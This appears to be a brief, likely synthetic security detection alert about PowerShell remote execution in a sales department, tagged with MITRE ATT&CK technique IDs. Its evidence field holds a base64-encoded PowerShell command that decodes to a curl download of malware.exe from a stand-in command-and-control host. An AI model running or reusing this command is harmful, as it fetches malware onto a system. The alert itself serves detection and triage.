title: PowerShell Variant - Sales Dept
description: Variant of PowerShell remote execution detected in Sales department.

evidence.content: Process creation: powershell.exe -EncodedCommand IAAgAGMAdQByAGwAIAAtAHMAIABoAHQAdABwADoALwAvAGMAMgAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIAAtAG8AIABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIA== user=admin T1059 T1547
Connection from 192.168.1.100 to c2-server.com:80. Downloaded malware.exe DLL Injection T1055
